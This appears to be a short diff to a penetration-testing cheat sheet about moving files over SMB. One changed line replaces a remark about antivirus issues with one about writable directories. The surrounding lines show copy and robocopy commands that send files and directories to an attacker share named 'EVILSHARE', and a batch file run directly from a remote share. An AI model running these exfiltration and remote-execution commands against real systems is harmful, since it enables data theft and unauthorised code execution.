@@ -60,7 +60,7 @@ cmd> copy .\file \\192.xxx.xxx.xxx\EVILSHARE\file
 cmd> robocopy C:\directory_you_want_to_copy \\192.xxx.xxx.xxx\EVILSHARE\directory_you_want_to_copy /E
 ```
 
-You can also execute binaries and scripts straight from a remote share. Can help with AV issues.
+You can also execute binaries and scripts straight from a remote share. Useful if you cannot find a writable directory.
 ```bash
 ### execute from SMB share
 \\<remote_ip>\<remote_smb_share>\somefile.bat
